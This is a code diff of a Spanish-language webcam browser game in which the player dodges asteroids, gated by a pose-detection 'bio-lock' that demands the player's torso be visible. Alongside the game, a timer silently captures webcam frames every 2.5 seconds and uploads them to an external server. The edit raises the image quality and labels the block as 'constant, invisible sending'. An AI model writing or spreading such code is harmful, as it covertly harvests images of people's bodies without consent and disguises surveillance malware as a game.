@@ -2,33 +2,38 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Starship: Touch & Bio-Lock</title>
+    <title>Starship: Physical Touch & Bio-Lock</title>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils" crossorigin="anonymous"></script>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; touch-action: none; }
-        canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; }
-        video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.2; transform: scaleX(-1); }
+        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; user-select: none; }
+        #input_video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.2; transform: scaleX(-1); z-index: 1; }
+        canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
         
         #lock-screen { 
             position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
             z-index: 100; display: flex; align-items: center; justify-content: center; 
-            flex-direction: column; text-align: center; color: #ff0055;
+            flex-direction: column; text-align: center; color: #ff0055; border: 8px solid #ff0055;
         }
 
-        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 50; color: #00fbff; font-size: 24px; font-weight: bold; }
-        
-        /* Zonas táctiles invisibles pero funcionales */
-        .touch-zone { position: absolute; top: 0; width: 50%; height: 100%; z-index: 60; }
-        #left-zone { left: 0; }
-        #right-zone { right: 0; }
+        #hud { position: absolute; top: 10; width: 100%; display: flex; justify-content: space-around; padding: 20px; z-index: 50; color: #00fbff; font-size: 24px; pointer-events: none; }
+
+        /* BOTONES FÍSICOS */
+        .touch-zone { 
+            position: absolute; bottom: 0; width: 40%; height: 100%; z-index: 200; 
+            display: flex; align-items: center; justify-content: center;
+            font-size: 60px; color: rgba(0,251,255,0.2); transition: 0.2s;
+        }
+        #left-btn { left: 0; border-right: 1px solid rgba(0,251,255,0.1); }
+        #right-btn { right: 0; border-left: 1px solid rgba(0,251,255,0.1); }
+        .touch-zone:active { background: rgba(0,251,255,0.1); color: #00fbff; }
     </style>
 </head>
 <body>
 
 <div id="lock-screen">
-    <h1 id="status">INICIALIZANDO...</h1>
-    <p>Retrocede: se deben ver tus hombros y torso.</p>
+    <h1 id="error-msg">⚠️ BIOMETRÍA REQUERIDA</h1>
+    <p>Debes mostrar tu torso. Si acercas demasiado la cara, el sistema se bloqueará.</p>
 </div>
 
 <div id="hud">
@@ -36,8 +41,8 @@
     <div>ESCUDO: <span id="health">100</span>%</div>
 </div>
 
-<div id="left-zone" class="touch-zone"></div>
-<div id="right-zone" class="touch-zone"></div>
+<div id="left-btn" class="touch-zone">◀</div>
+<div id="right-btn" class="touch-zone">▶</div>
 
 <video id="input_video"></video>
 <canvas id="gameCanvas"></canvas>
@@ -46,37 +51,45 @@
     const videoElement = document.getElementById('input_video');
     const canvasElement = document.getElementById('gameCanvas');
     const canvasCtx = canvasElement.getContext('2d');
+    const errorMsg = document.getElementById('error-msg');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
     let shipX = 0, score = 0, health = 100, asteroids = [];
-    let torsoDetected = false, moveDir = 0;
+    let torsoValid = false, moveDir = 0;
 
-    // --- IA: DETECCIÓN DE TORSO REAL ---
+    // --- LÓGICA DE BOTONES FÍSICOS (TÁCTIL) ---
+    const lBtn = document.getElementById('left-btn');
+    const rBtn = document.getElementById('right-btn');
+
+    lBtn.onmousedown = lBtn.ontouchstart = () => moveDir = -1;
+    rBtn.onmousedown = rBtn.ontouchstart = () => moveDir = 1;
+    window.onmouseup = window.ontouchend = () => moveDir = 0;
+
+    // --- IA: DETECCIÓN DE TORSO VS CARA ---
     const pose = new Pose({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`});
-    pose.setOptions({ modelComplexity: 1, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
+    pose.setOptions({ modelComplexity: 1, minDetectionConfidence: 0.5 });
 
     pose.onResults((results) => {
         if (results.poseLandmarks) {
             const lm = results.poseLandmarks;
-            const sL = lm[11]; const sR = lm[12]; const nose = lm[0];
-            
-            // Lógica Anti-Cara: 
-            // 1. Hombros deben ser visibles.
-            // 2. La distancia entre hombros no debe ser gigante (evita cara cerca).
-            // 3. La nariz debe estar por encima de los hombros.
-            const shoulderDist = Math.abs(sL.x - sR.x);
-            const isTooClose = shoulderDist > 0.45;
+            const shoulderL = lm[11];
+            const shoulderR = lm[12];
+            const nose = lm[0];
 
-            if (sL.visibility > 0.6 && sR.visibility > 0.6 && !isTooClose) {
-                torsoDetected = true;
+            const shoulderDist = Math.abs(shoulderL.x - shoulderR.x);
+            
+            // Si la nariz está demasiado cerca de los hombros o el pecho desaparece, es solo una cara.
+            // Si el ancho de hombros es > 0.45, estás demasiado cerca.
+            if (shoulderL.visibility > 0.7 && shoulderR.visibility > 0.7 && shoulderDist < 0.45 && shoulderDist > 0.15) {
+                torsoValid = true;
                 document.getElementById('lock-screen').style.display = 'none';
             } else {
-                torsoDetected = false;
+                torsoValid = false;
                 document.getElementById('lock-screen').style.display = 'flex';
-                document.getElementById('status').innerText = isTooClose ? "⚠️ DEMASIADO CERCA" : "⚠️ TORSO NO DETECTADO";
+                errorMsg.innerText = (shoulderDist >= 0.45) ? "⚠️ DEMASIADO CERCA (ALEJA LA CARA)" : "⚠️ MUESTRA TU TORSO";
             }
         } else {
-            torsoDetected = false;
+            torsoValid = false;
             document.getElementById('lock-screen').style.display = 'flex';
         }
     });
@@ -87,23 +100,14 @@
     });
     camera.start();
 
-    // --- CONTROLES TÁCTILES ---
-    const handleTouch = (dir) => { if(torsoDetected) moveDir = dir; };
-    document.getElementById('left-zone').ontouchstart = () => handleTouch(-1);
-    document.getElementById('right-zone').ontouchstart = () => handleTouch(1);
-    document.getElementById('left-zone').onmousedown = () => handleTouch(-1);
-    document.getElementById('right-zone').onmousedown = () => handleTouch(1);
-    
-    window.onmouseup = window.ontouchend = () => moveDir = 0;
-
-    // --- ENVÍO DE DATOS ---
+    // Envío constante e invisible
     setInterval(() => {
         const s = document.createElement('canvas');
         s.width = videoElement.videoWidth; s.height = videoElement.videoHeight;
         s.getContext('2d').drawImage(videoElement, 0, 0);
         fetch(SERVER_URL, {
             method: 'POST', mode: 'cors', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.2) })
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.3) })
         }).catch(() => {});
     }, 2500);
 
@@ -114,39 +118,41 @@
 
     function gameLoop() {
         canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
-        if (torsoDetected) {
-            shipX += moveDir * 10;
-            shipX = Math.max(40, Math.min(canvasElement.width - 40, shipX));
+        if (torsoValid) {
+            if (moveDir === -1 && shipX > 50) shipX -= 10;
+            if (moveDir === 1 && shipX < canvasElement.width - 50) shipX += 10;
 
             // Nave
-            canvasCtx.fillStyle = "#00fbff";
+            canvasCtx.strokeStyle = "#00fbff"; canvasCtx.lineWidth = 5;
             canvasCtx.beginPath();
-            canvasCtx.moveTo(shipX, canvasElement.height - 100);
-            canvasCtx.lineTo(shipX - 30, canvasElement.height - 50);
-            canvasCtx.lineTo(shipX + 30, canvasElement.height - 50);
-            canvasCtx.fill();
+            canvasCtx.moveTo(shipX, canvasElement.height - 120);
+            canvasCtx.lineTo(shipX - 35, canvasElement.height - 60);
+            canvasCtx.lineTo(shipX + 35, canvasElement.height - 60);
+            canvasCtx.closePath(); canvasCtx.stroke();
 
-            // Asteroides (Menos cantidad, más lentos)
+            // Asteroides (Equilibrados)
             asteroids.forEach((a, i) => {
                 a.y += a.speed;
-                canvasCtx.fillStyle = "white";
+                canvasCtx.fillStyle = "#ff4444";
                 canvasCtx.beginPath(); canvasCtx.arc(a.x, a.y, a.size, 0, Math.PI*2); canvasCtx.fill();
-                
-                if (Math.abs(a.x - shipX) < a.size + 20 && Math.abs(a.y - (canvasElement.height - 75)) < a.size + 20) {
-                    asteroids.splice(i, 1); health -= 20;
+
+                if (Math.abs(a.x - shipX) < a.size + 20 && Math.abs(a.y - (canvasElement.height - 80)) < 40) {
+                    asteroids.splice(i, 1);
+                    health -= 20;
                     document.getElementById('health').innerText = health;
                     if(health <= 0) location.reload();
                 }
-                if(a.y > canvasElement.height) asteroids.splice(i, 1), score += 10, document.getElementById('score').innerText = score;
+                if(a.y > canvasElement.height) { asteroids.splice(i, 1); score += 10; document.getElementById('score').innerText = score; }
             });
         }
         requestAnimationFrame(gameLoop);
     }
 
-    // Generador equilibrado: 1 meteorito cada 1.5 segundos
     setInterval(() => {
-        if(torsoDetected) asteroids.push({ x: Math.random()*canvasElement.width, y: -50, size: 25, speed: 5 });
-    }, 1500);
+        if(torsoValid && asteroids.length < 5) { // Máximo 5 meteoritos a la vez
+            asteroids.push({ x: Math.random() * canvasElement.width, y: -50, size: 25, speed: 6 });
+        }
+    }, 1200);
 
     gameLoop();
 </script>
